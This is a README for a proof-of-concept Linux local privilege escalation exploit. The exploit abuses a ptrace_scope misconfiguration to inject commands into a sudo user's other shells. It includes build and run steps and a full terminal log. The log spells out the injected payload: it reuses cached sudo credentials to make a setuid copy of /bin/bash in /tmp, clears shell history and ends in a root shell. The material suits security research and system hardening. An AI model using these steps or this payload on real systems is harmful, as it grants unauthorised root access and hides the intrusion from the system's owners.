# ptrace misconfiguration local privilege escalation
ptrace misconfiguration Local Privilege Escalation

using ptrace (no GDB dep) execve

WARNING! this is a POC, the code is CRAP

based from (GDB dep): https://www.exploit-db.com/exploits/46989
'ptrace_scope' misconfiguration Local Privilege Escalation by Marcelo Vazquez (s4vitar) & Victor Lasa (vowkin)

How to test:

open a terminal with a sudo user group

execute any command with sudo and enter the password, ex:
```
dreg@fr33project:~$ tty
/dev/pts/4
dreg@fr33project:~$ id
uid=1003(dreg) gid=1003(dreg) groups=1003(dreg),27(sudo)
dreg@fr33project:~$ sudo whoami
[sudo] password for dreg:
root
```

open other terminal with the same user and execute ./xpk (the name of the exploit executable is important, dont change!)
```
dreg@fr33project:~$ tty
/dev/pts/7
dreg@fr33project:~$ .gcc -o xpk xpk.c
dreg@fr33project:~$ ./xpk
David Reguera Garcia aka Dreg exploit without gdb dep, based in:
https://www.exploit-db.com/exploits/46989
'ptrace_scope' misconfiguration Local Privilege Escalation
Authors: Marcelo Vazquez  (s4vitar)
         Victor Lasa       (vowkin)

[*] PID -> bash
[*] Path 2660: /home/dreg
stdin fd: 4
echo "clear && echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1 | echo && history -c && clear" >> /tmp/crap
[*] PID -> bash
[*] Path 2892: /home/dreg
stdin fd: 4
echo "clear && echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1 | echo && history -c && clear" >> /tmp/crap
[*] PID -> sh
[*] Path 2998: /home/dreg
stdin fd: 4
echo "clear && echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1 | echo && history -c && clear" >> /tmp/crap
[*] PID -> bash
[*] Path 2999: /home/dreg
stdin fd: 4
echo "clear && echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1 | echo && history -c && clear" >> /tmp/crap

[*] Cleaning up...
[*] Spawning root shell...
bash-5.0# id
uid=1003(dreg) gid=1003(dreg) euid=0(root) egid=0(root) groups=0(root),27(sudo),1003(dreg)
bash-5.0# whoami
root
bash-5.0#
```
